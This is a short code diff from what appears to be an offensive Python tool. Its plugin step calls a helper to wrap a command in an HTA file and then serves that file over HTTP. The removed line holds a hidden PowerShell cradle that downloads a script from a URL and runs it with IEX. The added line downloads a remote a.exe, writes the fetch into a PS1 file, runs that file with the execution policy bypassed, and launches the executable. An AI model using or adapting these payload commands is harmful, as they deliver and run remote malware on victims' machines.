@@ -88,7 +88,7 @@ def aner():
     print "\n"
     et = raw_input("\033[1;94m[?]\033[1;m Execute Plugins? [" + yen + "]: ")  or yen
     if et == 'yes':
-        os.system('cd plugins && python shellgame-cli.py -k hello -c "powershell.exe -nop -w hidden -c $W=new-object net.webclient;$W.proxy=[Net.WebRequest]::GetSystemWebProxy();$W.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $W.downloadstring(' + url + ');" -o index.hta -p ShellBrowserWindow')
+        os.system('cd plugins && python shellgame-cli.py -k hello -c "cmd /c cd / & mkdir win & cd win & echo (wget ' + url + ' -OutFile a.exe) > b.PS1 & powershell -ExecutionPolicy ByPass -File b.ps1 & a.exe" -o index.hta -p ShellBrowserWindow')
     	os.system('cd plugins && php -S 0.0.0.0:80 &>/dev/null')
 	print "[*] http://0.0.0.0:80"
     elif et == 'no':
